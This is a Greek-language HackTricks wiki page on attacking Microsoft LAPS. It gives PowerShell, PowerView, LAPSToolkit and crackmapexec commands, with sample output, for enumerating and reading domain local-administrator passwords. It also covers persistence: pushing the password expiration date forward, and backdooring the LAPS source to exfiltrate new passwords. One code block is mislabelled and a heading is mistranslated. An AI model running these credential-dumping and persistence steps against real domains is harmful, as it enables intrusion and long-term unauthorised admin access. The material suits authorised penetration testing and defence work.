# LAPS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Βασικές Πληροφορίες

Το Local Administrator Password Solution (LAPS) είναι ένα εργαλείο που χρησιμοποιείται για τη διαχείριση ενός συστήματος, όπου εφαρμόζονται **κωδικοί πρόσβασης διαχειριστή**, οι οποίοι είναι **μοναδικοί, τυχαίοι και αλλάζουν συχνά**, σε υπολογιστές που έχουν ενταχθεί στον τομέα. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια μέσα στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες που έχουν δοθεί άδεια μέσω των Access Control Lists (ACLs). Η ασφάλεια των μεταδόσεων των κωδικών πρόσβασης από τον πελάτη στον διακομιστή εξασφαλίζεται με τη χρήση του **Kerberos έκδοση 5** και του **Advanced Encryption Standard (AES)**.

Στα αντικείμενα υπολογιστών του τομέα, η εφαρμογή του LAPS έχει ως αποτέλεσμα την προσθήκη δύο νέων χαρακτηριστικών: **`ms-mcs-AdmPwd`** και **`ms-mcs-AdmPwdExpirationTime`**. Αυτά τα χαρακτηριστικά αποθηκεύουν αντίστοιχα τον **κωδικό πρόσβασης του διαχειριστή σε καθαρό κείμενο** και το **χρόνο λήξης του**, αντίστοιχα.

### Έλεγχος εάν είναι ενεργοποιημένο
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Πρόσβαση στον κωδικό πρόσβασης του LAPS

Μπορείτε να **κατεβάσετε την αρχική πολιτική του LAPS** από το `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε το **`Parse-PolFile`** από το πακέτο [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) για να μετατρέψετε αυτό το αρχείο σε αναγνώσιμη μορφή από ανθρώπους.

Επιπλέον, μπορούν να χρησιμοποιηθούν οι **εντολές PowerShell του LAPS** αν είναι εγκατεστημένες σε έναν υπολογιστή στον οποίο έχουμε πρόσβαση:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
Το **PowerView** μπορεί επίσης να χρησιμοποιηθεί για να ανακαλύψει **ποιος μπορεί να διαβάσει τον κωδικό πρόσβασης και να τον διαβάσει**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### Εργαλειοθήκη LAPSToolkit

Η [εργαλειοθήκη LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει την απαρίθμηση των LAPS με αρκετές λειτουργίες.\
Μία από αυτές είναι η ανάλυση των **`ExtendedRights`** για **όλους τους υπολογιστές με ενεργοποιημένα LAPS**. Αυτό θα εμφανίσει τα **ομάδες** που έχουν ειδική εξουσιοδότηση για να διαβάζουν τους κωδικούς LAPS, οι οποίες συχνά είναι χρήστες σε προστατευμένες ομάδες.\
Ένας **λογαριασμός** που έχει ενταχθεί σε έναν υπολογιστή σε έναν τομέα λαμβάνει τα `All Extended Rights` πάνω σε αυτόν τον υπολογιστή, και αυτό το δικαίωμα δίνει στον **λογαριασμό** τη δυνατότητα να **διαβάζει κωδικούς πρόσβασης**. Η απαρίθμηση μπορεί να εμφανίσει έναν λογαριασμό χρήστη που μπορεί να διαβάσει τον κωδικό LAPS σε έναν υπολογιστή. Αυτό μπορεί να μας βοηθήσει να **επικεντρωθούμε σε συγκεκριμένους χρήστες του AD** που μπορούν να διαβάσουν τους κωδικούς LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Αποκλεισμός Κωδικών LAPS με το Crackmapexec**
Εάν δεν υπάρχει πρόσβαση σε ένα powershell, μπορείτε να καταχραστείτε αυτό το προνόμιο απομακρυσμένα μέσω του LDAP χρησιμοποιώντας το Crackmapexec.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Αυτό θα αποθηκεύσει όλους τους κωδικούς πρόσβασης που ο χρήστης μπορεί να διαβάσει, επιτρέποντάς σας να έχετε μια καλύτερη πρόσβαση με έναν διαφορετικό χρήστη.

## **Μόνιμη Επιμονή LAPS**

### **Ημερομηνία Λήξης**

Μόλις γίνετε διαχειριστής, είναι δυνατόν να **αποκτήσετε τους κωδικούς πρόσβασης** και να **εμποδίσετε** έναν υπολογιστή να **ενημερώνει** τον **κωδικό πρόσβασής του** με το να **ορίσετε την ημερομηνία λήξης στο μέλλον**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Ο κωδικός θα επαναφέρεται ακόμα και αν ένας **διαχειριστής** χρησιμοποιήσει την εντολή **`Reset-AdmPwdPassword`** ή αν είναι ενεργοποιημένη η επιλογή **Να μην επιτρέπεται η μεγαλύτερη διάρκεια λήξης κωδικού από αυτή που απαιτείται από την πολιτική** στην LAPS GPO.
{% endhint %}

### Πίσω πόρτα

Ο αρχικός πηγαίος κώδικας για το LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατόν να τοποθετηθεί μια πίσω πόρτα στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο αρχείο `Main/AdmPwd.PS/Main.cs` για παράδειγμα) που θα **εξαγάγει νέους κωδικούς ή θα τους αποθηκεύσει κάπου**.

Στη συνέχεια, απλά μεταγλωττίστε το νέο `AdmPwd.PS.dll` και ανεβάστε το στη μηχανή στη διαδρομή `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε την ώρα τροποποίησης).

## Αναφορές
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
